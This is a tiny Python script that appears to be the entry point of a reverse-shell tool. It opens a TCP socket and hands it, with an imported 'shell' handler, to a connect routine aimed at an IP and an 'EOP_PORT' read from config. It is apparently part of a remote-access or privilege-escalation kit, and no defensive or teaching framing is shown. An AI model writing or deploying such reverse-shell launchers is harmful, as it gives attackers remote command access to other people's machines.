import socket
from client import connect_server, shell
from lib import config

if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect_server(sock, (config.IP, config.EOP_PORT), shell, 5)
